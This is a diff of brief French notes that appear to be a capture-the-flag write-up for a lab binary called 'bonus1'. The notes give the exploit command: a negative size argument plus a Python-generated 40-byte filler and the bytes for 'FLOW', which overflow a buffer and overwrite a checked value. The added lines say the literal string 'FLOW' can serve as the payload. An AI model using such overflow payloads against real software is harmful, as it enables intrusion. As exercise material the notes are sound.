@@ -41,3 +41,7 @@ il faut un buffer de taille minimum 44 (40 pour le buffer et 4 pour la valeur à
 ./bonus1 -1073741813 $(python -c 'print "\x41" * 40 + "\x46\x4c\x4f\x57"')
 
 à noter qu'on pourrait prendre un buffer plus grand tant qu'on écrit au même endroit
+
+aussi la string "FLOW" = 0x574f4c46 donc possibilité de deuxième argument :
+
+    $(python -c 'print "\x41" * 40 + "FLOW"')
